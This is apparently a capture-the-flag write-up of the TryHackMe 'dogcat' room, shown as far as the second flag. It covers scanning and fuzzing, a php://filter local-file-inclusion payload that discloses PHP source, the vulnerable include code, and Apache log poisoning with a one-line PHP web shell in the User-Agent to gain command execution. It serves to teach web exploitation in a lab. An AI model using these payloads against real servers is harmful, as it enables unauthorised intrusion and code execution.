# dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

---

I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!\
This machine may take a few minutes to fully start up.

[Link](https://tryhackme.com/room/dogcat) to the room

---

Let's start with a version and script scan against the target machine
```
$ sudo nmap -sV -sC <machine_ip> -Pn -n --disable-arp-ping

<...snip...>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/009bc8a6-b486-4d12-9bd3-484bdc1a8172)

The web app is about images of cats and dogs, no surprise. Let's fuzz for hidden content.
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<machine_ip>/FUZZ"

<...snip...>
cats                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
dogs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 99ms]
```

We assume that these folders contain the content of the web app (images of cats and dogs).
But we don't have permissions to access them.

Let's try making use of the first flag's hint: *There's more to *view* than just cats and dogs...*.\
Notice that view is the name of the query argument when calling the api for a random cat/dog image.
We can try and fuzz to discover more values that are accepted by that argument:
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<machine_ip>/?view=FUZZ" -fs 455

<...snip...>
category                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 39ms]
<...snip...>
```

The command returns many entries. Note that `-fs 455` is used to exclude entries that return the standard response of "Sorry, only dogs or cats are allowed".

Navigating to `http://<machine_ip>/?view=catalog`, we get the following:
![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/70e44b57-bf4b-45cd-a15e-889d8d9d2e49)

Allright, now we know that the value of `view` is attached to ".php" extension and then passed to the `include` function.\
Since this is the case, we can use a php filter to disclose the source code of php files in the server. But first, lets see what php files do we have there:
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt:FUZZ -u "http://<machine_ip>/FUZZ" -e .php

<...snip...>
flag.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
<...snip...>
```

Interestingly, we found a flag file. Now we can use the read filter to get its content encoded in base64.\
When testing the payload, I was getting the "Sorry, only dogs or cats are allowed" error, so I tried many assumptions on how the app is verifying this conditions.
One of them, which later succeeded, is that the app checks if the value of the path contains "cat" or "dog".\
Hence, to get the flag, we pass the value `http://<machine_ip>/?view=php://filter/read=convert.base64-encode/resource=cats/../flag`. We used "cats" because this is an existing folder on the server, and from which we know the relative location of "flag.php".

We decode the base64 string and get our first flag.

Having access to php files on the server, we need to figure out how to get more access.\
Let's get the index file (same directory as flag.php) and see how the app actually works.
```PHP
<...snip...>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
<...snip...>
```
First, we now validate how the app decides when a value of *view* is valid. And second, the url argument *ext* is used to specify the extension of the file to include and thus, we can now include whatever file (according to permissions) on the server.

One common method to exploit LFI vulnerabilities is log poisonning. For this, we poison our user-agent to acheive RCE when we include the log file.\

- Log file location : `/var/log/apache2/access.log`
- User Agent : `<h1><?php system($_GET['cmd']); ?></h1>`
- Result when visiting `http://<machine_ip>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=id`
![Screenshot_2023-12-08_20_29_42](https://github.com/elomarii/CTF_4_DAY/assets/106914699/62233aba-1ee3-4977-9435-09672e19054a)


Now that we can execute commands on the target machine, let's discover files there.\
We find the second flag on the parent folder of where the app lives (execute command `ls ..`).




